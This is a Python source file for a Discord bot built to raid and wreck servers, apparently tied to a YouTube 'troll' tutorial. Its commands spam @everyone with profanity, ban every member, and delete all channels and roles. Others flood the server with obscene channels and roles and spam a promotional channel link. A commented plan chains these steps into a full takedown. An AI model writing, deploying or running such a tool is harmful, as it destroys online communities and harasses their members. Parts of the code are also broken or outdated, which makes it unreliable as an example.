""" for the video on this bot paste this link in your browser https://www.youtube.com/watch?v=apbaN9UZqR8 """


import discord
from discord.ext import commands
from random import choice
from discord.utils import get


dictionary = ['fuck', 'dick', 'pussy', 'ass', 'cunt', 'hell', 'dam', 'bitch', 'balls']

client = commands.Bot(command_prefix = "!")


@client.event
async def on_ready():
    print("We have logged in!")

@client.command(pass_context=True)
async def spam(ctx):
    await ctx.message.delete()
    for i in range(100):
        await ctx.send("@everyone fuck dick pussy ass cunt hell dam bitch balls")

@client.command()
async def ban(ctx, member: discord.Member, *, reason = None):
    await member.ban(reason = reason)

@client.command()
async def banall(ctx, *, reason = None):
    for member in ctx.guild.members:
        if member != ctx.message.author and not member.bot:
            try:
                await member.ban(reason = reason)
            except Exception:
                pass

@client.command(pass_context=True)
async def destroy(ctx):
    for text_channel in ctx.guild.text_channels:
        try: await text_channel.delete()
        except Exception: pass

    for voice_channel in ctx.guild.voice_channels:
        try: await voice_channel.delete()
        except Exception: pass

    for category in ctx.guild.categories:
        try: await category.delete()
        except Exception: pass

    roles = await ctx.guild.fetch_roles()
    for role in roles:
        try: await role.delete()
        except Exception: pass



@client.command(pass_context=True)
async def quickfill(ctx, *, amount: int = 10):
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(choice(dictionary))
        except Exception:
            pass

        try:
            await ctx.guild.create_role(name=choice(dictionary))
        except Exception:
            pass

@client.command(pass_context=True)
async def fill(ctx, *, amount: int = 10):
    for i in range(amount):
        try:
            category = await ctx.guild.create_category(choice(dictionary))

            await category.create_voice_channel(choice(dictionary))
            channel = await category.create_text_channel(choice(dictionary))
            for i in range(5):
                await channel.send(choice(dictionary))
        except Exception:
            pass

        try:
            await ctx.guild.create_role(name=choice(dictionary))
        except Exception:
            pass


@client.command(pass_context=True)
async def add(ctx, user: discord.Member, role: discord.Role):
    await user.add_roles(role)
    await ctx.send(f"hey {ctx.author.name}, you do not have permission to perform that action: give {user.name} {role.name}")


@client.command(pass_context=True)
async def remove(ctx, user: discord.Member, role: discord.Role):
    await user.remove_roles(role)
    await ctx.send(f"hey {ctx.author.name}, you do not have permission to perform that action: remove {user.name} {role.name}")



@client.command(pass_context =True)
async def dm(ctx, member : discord.Member = None, *, message):
    if not member:
        return await client.say(ctx.message.author.mention + "Specify a user to DM!")
    if member == "@everyone":
        for server_member in ctx.message.server.members:
            await client.send_message(server_member, message)



"""@client.command()
async def oof(ctx):
    c= await ctx.send('are you sure?')
    await c.add_reaction('✅')
    
    await ctx.send('ok')

    
    

      make the command run !spam then 5 seconds later !destroy then !fill then !ad then 5 minutes later !banall

 

    """


@client.command(pass_context=True)
async def ad(ctx, *, amount: int = 10):
    
   for i in range(amount):
        try:
            category = await ctx.guild.create_category('Trollmaster69YT')

            await category.create_voice_channel('Trollmaster69YT')
            channel = await category.create_text_channel('Trollmaster69YT')
            
            for i in range(20):
                await channel.send('https://www.youtube.com/channel/UCnYATDC4CVpYGQzz_g_0oLA @everyone @here')
        except Exception:
            pass

        try:
            await ctx.guild.create_role(name='Trollmaster69YT')
        except Exception:
            pass





client.run("your bot token)           
